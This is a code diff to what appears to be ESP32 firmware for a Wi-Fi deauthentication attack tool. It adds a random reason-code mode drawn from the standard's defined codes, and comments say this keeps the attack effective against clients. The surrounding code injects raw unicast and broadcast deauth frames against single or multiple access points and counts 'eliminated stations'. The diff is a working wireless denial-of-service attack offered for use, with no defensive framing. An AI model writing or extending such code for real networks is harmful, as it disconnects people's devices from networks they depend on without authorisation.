@@ -49,6 +49,15 @@ const int kRxLogSize = 12;
 
 attack_mode_t s_mode = ATTACK_IDLE;
 uint16_t s_reason = 1;
+// Reason-code mode. In random mode every burst gets a fresh code drawn from
+// kReasonPool, which holds only the codes the standard actually defines --
+// undefined values are frequently ignored by clients, so "uniform 1..65535"
+// would make the attack look broken.
+bool s_reason_random = false;
+uint16_t s_reason_last = 1;
+
+const uint16_t kReasonPool[] = {1,  2,  3,  4,  5,  6,  7,  8,  9,  10, 11, 13,
+                                14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24};
 
 ap_target_t s_aps[MAX_AP_TARGETS];
 int s_ap_count = 0;
@@ -99,6 +108,7 @@ uint32_t s_last_blind_ms = 0;
 // burst is drained frame by frame across ticks and never silently loses frames.
 uint8_t s_burst_client[6];
 uint8_t s_burst_bssid[6];
+uint16_t s_burst_reason = 1;
 int s_burst_left = 0;
 uint32_t s_backoff_until_ms = 0;
 // Received frames by category: management subtypes 0..15 (deauth = 12),
@@ -276,10 +286,19 @@ void queue_deauth(const uint8_t client[6], const uint8_t bssid[6]) {
     s_txq_head = next;
 }
 
+uint16_t next_reason(void) {
+    if (!s_reason_random) {
+        s_reason_last = s_reason;
+        return s_reason;
+    }
+    s_reason_last = kReasonPool[pseudo_rand() % (sizeof(kReasonPool) / sizeof(kReasonPool[0]))];
+    return s_reason_last;
+}
+
 // Returns true when the driver accepted the frame.
-bool inject_one(const uint8_t station[6], const uint8_t bssid[6]) {
+bool inject_one(const uint8_t station[6], const uint8_t bssid[6], uint16_t reason) {
     uint8_t frame[32];
-    const size_t len = build_deauth(frame, station, bssid, s_reason);
+    const size_t len = build_deauth(frame, station, bssid, reason);
     const esp_err_t res = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
     if (res != ESP_OK) {
         s_tx_err++;
@@ -312,6 +331,7 @@ void drain_tx_queue(void) {
         memcpy(s_burst_bssid, s_txq[s_txq_tail].bssid, 6);
         s_txq_tail = (s_txq_tail + 1) % kTxQueue;
         s_burst_left = NUM_FRAMES_PER_DEAUTH;
+        s_burst_reason = next_reason();
         eliminated_stations++;
         if (s_mode == ATTACK_DEAUTH_MULTI) {
             const int idx = find_ap(s_burst_bssid);
@@ -321,7 +341,7 @@ void drain_tx_queue(void) {
         }
     }
     while (s_burst_left > 0) {
-        if (!inject_one(s_burst_client, s_burst_bssid)) {
+        if (!inject_one(s_burst_client, s_burst_bssid, s_burst_reason)) {
             return;  // buffers full: retry this frame after the backoff
         }
         s_burst_left--;
@@ -330,7 +350,7 @@ void drain_tx_queue(void) {
     // One broadcast deauth on top of the unicast burst: plenty of cheap clients
     // only act on the broadcast form, and it costs a single frame.
     for (int i = 0; i < NUM_BROADCAST_PER_DEAUTH; i++) {
-        if (!inject_one(kBroadcast, s_burst_bssid)) {
+        if (!inject_one(kBroadcast, s_burst_bssid, s_burst_reason)) {
             return;
         }
     }
@@ -644,7 +664,7 @@ void attack_step() {
     if (s_mode == ATTACK_DEAUTH_SINGLE) {
         if (now - s_last_blind_ms >= BLIND_DEAUTH_PERIOD_MS) {
             s_last_blind_ms = now;
-            if (inject_one(kBroadcast, s_single_bssid)) {
+            if (inject_one(kBroadcast, s_single_bssid, next_reason())) {
                 s_blind_frames++;
             }
         }
@@ -654,7 +674,7 @@ void attack_step() {
             for (int tries = 0; tries < s_ap_count; tries++) {
                 const int idx = (s_ap_cursor + tries + s_ap_count) % s_ap_count;
                 if (s_aps[idx].enabled) {
-                    if (inject_one(kBroadcast, s_aps[idx].bssid)) {
+                    if (inject_one(kBroadcast, s_aps[idx].bssid, next_reason())) {
                         s_blind_frames++;
                         s_aps[idx].frames++;
                     }
@@ -767,6 +787,35 @@ uint32_t attack_tx_dropped(void) {
 
 uint32_t attack_blind_frames() {
     return s_blind_frames;
+}
+
+void attack_set_reason(uint16_t code) {
+    s_reason = code == 0 ? 1 : code;
+    s_reason_last = s_reason;
+    s_reason_random = false;
+}
+
+void attack_set_reason_random(void) {
+    s_reason_random = true;
+}
+
+bool attack_reason_is_random(void) {
+    return s_reason_random;
+}
+
+uint16_t attack_reason_last(void) {
+    return s_reason_last;
+}
+
+// Defined reason codes: everything a client is expected to understand. Used by
+// the console to warn when a custom value is outside this set.
+bool attack_reason_is_defined(uint16_t code) {
+    for (size_t i = 0; i < sizeof(kReasonPool) / sizeof(kReasonPool[0]); i++) {
+        if (kReasonPool[i] == code) {
+            return true;
+        }
+    }
+    return false;
 }
 
 void attack_rx_mix(uint32_t mgmt_sub[16], uint32_t* ctrl, uint32_t* data) {
